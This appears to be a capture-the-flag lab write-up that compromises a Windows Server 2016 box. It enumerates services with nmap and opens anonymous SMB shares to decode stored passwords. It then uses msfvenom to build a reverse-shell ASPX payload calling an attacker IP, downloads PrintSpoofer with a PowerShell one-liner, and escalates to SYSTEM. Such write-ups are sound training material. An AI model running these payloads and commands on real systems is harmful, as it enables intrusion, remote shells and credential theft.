## nmap -sVC -A 10.10.139.161 -T5 -Pn
```bash
Nmap scan report for 10.10.139.161
Host is up (0.38s latency).
Not shown: 995 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds  Windows Server 2016 Standard Evaluation 14393 microsoft-ds
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: RELEVANT
|   NetBIOS_Domain_Name: RELEVANT
|   NetBIOS_Computer_Name: RELEVANT
|   DNS_Domain_Name: Relevant
|   DNS_Computer_Name: Relevant
|   Product_Version: 10.0.14393
|_  System_Time: 2022-03-31T07:55:37+00:00
| ssl-cert: Subject: commonName=Relevant
| Not valid before: 2022-03-30T07:12:13
|_Not valid after:  2022-09-29T07:12:13
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2016|10 (90%)
OS CPE: cpe:/o:microsoft:windows_server_2016 cpe:/o:microsoft:windows_10:1607
Aggressive OS guesses: Microsoft Windows Server 2016 (90%), Microsoft Windows 10 1607 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1h45m02s, deviation: 3h30m03s, median: 0s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2022-03-31T07:55:36
|_  start_date: 2022-03-31T07:12:40
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard Evaluation 14393 (Windows Server 2016 Standard Evaluation 6.3)
|   Computer name: Relevant
|   NetBIOS computer name: RELEVANT\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2022-03-31T00:55:40-07:00

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   272.62 ms 10.2.0.1
2   ... 3
4   447.88 ms 10.10.139.161

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 543.45 seconds
```

## smbclient -L //10.10.139.161  -N
```bash
	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	nt4wrksv        Disk      
```


## smbclient //10.10.139.161/nt4wrksv -N
```
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Jul 25 23:46:04 2020
  ..                                  D        0  Sat Jul 25 23:46:04 2020
  passwords.txt                       A       98  Sat Jul 25 17:15:33 2020

		7735807 blocks of size 4096. 5137279 blocks available
smb: \> get passwords.txt
getting file \passwords.txt of size 98 as passwords.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
```
## cat passwords.txt 
```
[User Passwords - Encoded]
Qm9iIC0gIVBAJCRXMHJEITEyMw==
QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQkr
```
```
Bob - !P@$$W0rD!123
Bill - Juw4nnaM4n420696969!$$$
```

## msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.2.92.176 LPORT=1234 -f aspx -o shell.aspx
```bash
smb: \> put shell.aspx
putting file shell.aspx as \shell.aspx (2.1 kb/s) (average 1.8 kb/s)
```

## Privilege Escalation
```bash
c:\Users\Bob\Desktop>whoami /priv
```
```bash
PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled      ************
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```
### Download print spoofer https://github.com/itm4n/PrintSpoofer/releases/tag/v1.0
```bash
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.2.92.176:8000/PrintSpoofer64.exe','C:\Users\bob\Desktop\PrintSpoofer64.exe')"
```
```bash
c:\Users\Bob\Desktop>PrintSpoofer64.exe -i -c powershell.exe
PrintSpoofer64.exe -i -c powershell.exe
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
Windows PowerShell 
Copyright (C) 2016 Microsoft Corporation. All rights reserved.

PS C:\Windows\system32> whoami
whoami
nt authority\system
```
